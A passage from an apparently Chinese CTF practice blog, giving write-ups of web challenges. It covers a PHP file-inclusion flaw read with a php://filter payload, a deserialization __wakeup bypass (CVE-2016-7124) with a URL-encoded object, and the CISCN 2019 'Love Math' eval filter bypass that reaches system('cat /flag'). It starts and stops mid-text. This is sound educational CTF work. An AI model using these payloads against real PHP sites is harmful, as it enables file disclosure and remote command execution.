class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">body</span> <span class=\"attr\">style</span>=<span class=\"string\">\"background-color:black;\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">style</span>=<span class=\"string\">\"font-family:verdana;color:red;text-align:center;\"</span>&gt;</span>你想知道蒋璐源的秘密么？<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">p</span> <span class=\"attr\">style</span>=<span class=\"string\">\"font-family:arial;color:red;font-size:20px;text-align:center;\"</span>&gt;</span>想要的话可以给你，去找吧！把一切都放在那里了！<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">id</span>=<span class=\"string\">\"master\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"./Archive_room.php\"</span> <span class=\"attr\">style</span>=<span class=\"string\">\"background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;\"</span>&gt;</span>Oh! You found me<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"position: absolute;bottom: 0;width: 99%;\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">p</span> <span class=\"attr\">align</span>=<span class=\"string\">\"center\"</span> <span class=\"attr\">style</span>=<span class=\"string\">\"font:italic 15px Georgia,serif;color:white;\"</span>&gt;</span> Syclover @ cl4y<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>点击其中的链接</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">style</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/css\"</span> &gt;</span></span><br><span class=\"line\"><span class=\"css\"><span class=\"selector-id\">#master</span>\t&#123;</span></span><br><span class=\"line\"><span class=\"css\">    <span class=\"selector-tag\">position</span><span class=\"selector-pseudo\">:absolute</span>;</span></span><br><span class=\"line\"><span class=\"css\">    <span class=\"selector-tag\">left</span><span class=\"selector-pseudo\">:44</span>%;</span></span><br><span class=\"line\"><span class=\"css\">    <span class=\"selector-tag\">bottom</span><span class=\"selector-pseudo\">:20</span>;</span></span><br><span class=\"line\"><span class=\"css\">    <span class=\"selector-tag\">text-align</span> <span class=\"selector-pseudo\">:center</span>;</span></span><br><span class=\"line\">    \t&#125;</span><br><span class=\"line\">        p,h1 &#123;</span><br><span class=\"line\">                cursor: default;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"utf-8\"</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>绝密档案<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">body</span> <span class=\"attr\">style</span>=<span class=\"string\">\"background-color:black;\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">style</span>=<span class=\"string\">\"font-family:verdana;color:red;text-align:center;\"</span>&gt;</span></span><br><span class=\"line\">\t\t我把他们都放在这里了，去看看吧\t\t<span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">id</span>=<span class=\"string\">\"master\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"./action.php\"</span> <span class=\"attr\">style</span>=<span class=\"string\">\"background-color:red;height:50px;width:200px;color:#FFFFFF;left:44%;\"</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">font</span> <span class=\"attr\">size</span>=<span class=\"string\">6</span>&gt;</span>SECRET<span class=\"tag\">&lt;/<span class=\"name\">font</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"position: absolute;bottom: 0;width: 99%;\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">p</span> <span class=\"attr\">align</span>=<span class=\"string\">\"center\"</span> <span class=\"attr\">style</span>=<span class=\"string\">\"font:italic 15px Georgia,serif;color:white;\"</span>&gt;</span> Syclover @ cl4y<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>再次点击链接</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">        p,h1 &#123;</span><br><span class=\"line\">                cursor: default;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"utf-8\"</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>END<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">body</span> <span class=\"attr\">style</span>=<span class=\"string\">\"background-color:black;\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">style</span>=<span class=\"string\">\"font-family:verdana;color:red;text-align:center;\"</span>&gt;</span>查阅结束<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span> <span class=\"attr\">style</span>=<span class=\"string\">\"font-family:arial;color:red;font-size:20px;text-align:center;\"</span>&gt;</span>没看清么？回去再仔细看看吧。<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"position: absolute;bottom: 0;width: 99%;\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">p</span> <span class=\"attr\">align</span>=<span class=\"string\">\"center\"</span> <span class=\"attr\">style</span>=<span class=\"string\">\"font:italic 15px Georgia,serif;color:white;\"</span>&gt;</span> Syclover @ cl4y<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>和之前南邮cft的一道web有点像</p>\n<p>直接上burp suite</p>\n<p>一直点，查看记录，发现有一个</p>\n<p><img src=\"/pic/12.png\" alt=\"\"></p>\n<p>打开发现源码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">    &lt;title&gt;secret&lt;&#x2F;title&gt;</span><br><span class=\"line\">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">    error_reporting(0);</span><br><span class=\"line\">    $file&#x3D;$_GET[&#39;file&#39;];</span><br><span class=\"line\">    if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class=\"line\">        echo &quot;Oh no!&quot;;</span><br><span class=\"line\">        exit();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    include($file); </span><br><span class=\"line\">&#x2F;&#x2F;flag放在了flag.php里</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>\n\n<p><code>payload：?file=php://filter/read=convert.base64-encode/resource=./flag.php</code></p>\n<p>将得到的base64解码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;head&gt;</span><br><span class=\"line\">        &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class=\"line\">        &lt;title&gt;FLAG&lt;&#x2F;title&gt;</span><br><span class=\"line\">    &lt;&#x2F;head&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;body style&#x3D;&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class=\"line\">        </span><br><span class=\"line\">        &lt;h1 style&#x3D;&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;ååï¼ä½ æ¾å°æäºï¼å¯æ¯ä½ çä¸å°æQAQ~~~&lt;&#x2F;h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class=\"line\">        </span><br><span class=\"line\">        &lt;p style&#x3D;&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;</span><br><span class=\"line\">            &lt;?php</span><br><span class=\"line\">                echo &quot;æå°±å¨è¿é&quot;;</span><br><span class=\"line\">                $flag &#x3D; &#39;flag&#123;d144e819-346a-49ab-98e7-2fea0b2b9f6d&#125;&#39;;</span><br><span class=\"line\">                $secret &#x3D; &#39;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#39;</span><br><span class=\"line\">            ?&gt;</span><br><span class=\"line\">        &lt;&#x2F;p&gt;</span><br><span class=\"line\">    &lt;&#x2F;body&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;&#x2F;htmlPgo</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"PHP\"><a href=\"#PHP\" class=\"headerlink\" title=\"PHP\"></a>PHP</h3><p>常规扫描手工or御剑，发现<code>www.zip</code>存在源码</p>\n<p>class.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">'flag.php'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Name</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $username = <span class=\"string\">'nonono'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $password = <span class=\"string\">'yesyes'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($username,$password)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;username = $username;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;password = $password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;username = <span class=\"string\">'guest'</span>;    <span class=\"comment\">//此处需要绕过</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">$this</span>-&gt;password != <span class=\"number\">100</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"You name is: \"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;username;<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;/br&gt;\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"You password is: \"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;password;<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;/br&gt;\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">$this</span>-&gt;username === <span class=\"string\">'admin'</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">global</span> $flag;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> $flag;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">            </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$a=<span class=\"keyword\">new</span> Name(<span class=\"string\">'admin'</span>,<span class=\"number\">100</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">var_dump(serialize($a));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>index.php中关键代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">   <span class=\"keyword\">include</span> <span class=\"string\">'class.php'</span>;</span><br><span class=\"line\">   $select = $_GET[<span class=\"string\">'select'</span>];</span><br><span class=\"line\">   $res=unserialize(@$select);</span><br><span class=\"line\">   <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>flag.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$flag = <span class=\"string\">'Syc&#123;dog_dog_dog_dog&#125;'</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>分析后这是一个序列化+绕过<code>__wakeup()</code>  </p>\n<p><code>unserialize()</code> 会检查是否存在一个 <code>__wakeup()</code> 方法。如果存在，则会先调用 <code>__wakeup</code> 方法，预先准备对象需要的资源。</p>\n<p><code>serialize()</code> 会检查是否存在一个 <code>__sleep()</code> 方法。如果存在，则会先调用 <code>__sleep()</code> 。</p>\n<p><code>CVE-2016-7124</code>提到<code>unserialize()</code> 绕过<code>__wakeup()</code>的方法，在序列化后对象数量声明中大于原本的的数量即可绕过。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Name</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $username = <span class=\"string\">'admin'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $password = <span class=\"number\">100</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$a=<span class=\"keyword\">new</span> Name();</span><br><span class=\"line\">var_dump(urlencode(serialize($a))); <span class=\"comment\">//O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D</span></span><br><span class=\"line\">var_dump(serialize($a));<span class=\"comment\">//O:4:\"Name\":2:&#123;s:14:\"�Name�username\";s:5:\"admin\";s:14:\"�Name�password\";i:100;&#125;   </span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>因为有不可打印字符，所以选择经过URL编码后的</p>\n<p><code>payload：O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D</code></p>\n<p><img src=\"/pic/13.png\" alt=\"\"></p>"},{"title":"buuoj刷题记录7","date":"2020-01-10T14:19:24.000Z","_content":"\n## CISCN 2019 初赛 Love Math\n\n## 0x00 基础\n\n`eval`可以执行PHP语句\n\n`hex2bin`可以将十六进制的字符转成字符串，结果是字符串类型\n\n`dechex`将十进制转换成十六进制，结果是字符串类型\n\nPHP中数组除了可以使用[ ]  还可以使用{ }\n\nPHP中调用shell命令使用`system()`\n\n<!--more-->\n\nPHP中关于进制转换函数,*dec 都是整型，其他都是字符串类型\n\nhttps://blog.csdn.net/Auuuuuuuu/article/details/88778852\n\n## 0x02 分析\n\n源码分析\n\n```php\n<?php\nerror_reporting(0);\n//听说你很喜欢数学，不知道你是否爱它胜过爱flag\nif(!isset($_GET['c'])){\n    show_source(__FILE__);\n}else{\n    //例子 c=20-1\n    $content = $_GET['c'];\n    if (strlen($content) >= 80) {\n        die(\"太长了不会算\");\n    }\n    $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]'];\n    foreach ($blacklist as $blackitem) {\n        if (preg_match('/' . $blackitem . '/m', $content)) {\n            die(\"请不要输入奇奇怪怪的字符\");\n        }\n    }\n    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp\n    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];\n    preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs);  \n    foreach ($used_funcs[0] as $func) {\n        if (!in_array($func, $whitelist)) {\n            die(\"请不要输入奇奇怪怪的函数\");\n        }\n    }\n    //帮你算出答案\n    eval('echo '.$content.';');\n} \n```\n\n会将输入的字符进行过滤，过滤了空格、换行符、制表符、单双引号、反引号、中括号，以及只能出现白名单中的单词。\n\n最后有一个`eval`可以执行PHP语句，想办法构造$\\_GET或者$\\_POST\n\n可以利用函数转变也可以使用异或\n\n## 0x03 操作\n\npayload1：`?sin=cat /flag&cos=system&c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{cos}($$pi{sin})`\n\n![](/pic/23.png)\n\n异或方法\n\n开始用python写，字符串转十六进制，纠结了很久很久，只有int可以异或。还是选择PHP\n\n```php\n<?php\n$need=['_GET','_POST','_REQUEST'];\n$whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];\nforeach ($whitelist as $item )\n{\n    foreach ($need as $x)\n    {\n\n        if (in_array($x ^ $item^ $item ,$need))  //在PHP中异或\n        {\n            echo $x ^ $item;\n            echo '|--- '.$x.' --- '.$item;\n            echo '|<br/>';\n        }\n        \n    }\n}\n?>\n```\n\n在结果中发现有一个纯数字的还有一个`9**0`,但是没想到怎么利用`9**0`\n\n```bash\n9**0|--- _GET --- fmod|\n8\"1&|--- _GET --- getrandmax|\n85;!5|--- _POST --- getrandmax|\n871#4+79|--- _REQUEST --- getrandmax|\n7\"=0|--- _GET --- hexdec|\n75771|--- _POST --- hexdec|\n7>5;|--- _GET --- 